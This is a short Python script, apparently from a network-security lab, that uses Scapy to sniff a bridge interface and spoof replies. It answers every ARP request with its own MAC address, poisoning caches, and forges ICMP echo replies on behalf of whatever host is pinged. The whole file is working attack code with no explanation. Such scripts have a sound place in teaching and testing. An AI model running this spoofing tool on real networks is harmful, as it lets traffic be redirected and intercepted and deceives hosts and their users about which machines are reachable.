from scapy.all import *

interface = 'br-2b1fb0c14649'
macAddr = get_if_hwaddr(interface)
ip_addr = get_if_addr(interface)


def spoof_reply(pkt):
    if pkt.haslayer('ARP') and pkt[ARP].op == 1:
        reply = ARP(op = 2,hwsrc = macAddr,hwdst = pkt[ARP].hwsrc, psrc = pkt[ARP].pdst  , pdst = pkt[ARP].psrc)
        send(reply)
    
    elif pkt.haslayer('ICMP') and pkt[ICMP].type == 8:
        dst = pkt[1].dst
        src = pkt[1].src
        seq = pkt[2].seq 
        id = pkt[2].id     
        load = pkt[3].load
        reply = IP(src = dst, dst = src)/ICMP(type = 0, id = id, seq=seq)/load
        print("spoofed icmp")
        send (reply)
        


sniff(prn = spoof_reply, iface = interface)

